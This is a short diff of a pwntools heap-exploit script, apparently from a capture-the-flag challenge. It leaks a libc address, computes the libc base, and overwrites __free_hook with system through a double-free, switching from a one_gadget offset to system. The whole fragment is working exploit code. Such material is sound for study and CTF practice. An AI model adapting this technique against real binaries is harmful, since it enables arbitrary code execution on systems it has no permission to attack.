@@ -41,11 +41,10 @@ p.recvuntil(b'Content: ')
 stdout = u64(p.recv(6).ljust(8, b'\x00'))
 libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
 free_hook = libc_base + libc.symbols['__free_hook']
-one_gadget = libc_base + 0x4f432
+system = libc_base + libc.symbols['system']
 
 slog('libc_base', libc_base)
 slog('free_hook', free_hook)
-slog('one_gadget', one_gadget)
 
 alloc(0x40, b'BBBB')
 free()
@@ -54,7 +53,6 @@ free()
 
 alloc(0x40, p64(free_hook))
 alloc(0x40, b'DDDDDDDD')
-system = libc_base + libc.symbols['system']
 alloc(0x40, p64(system))     
                              
 
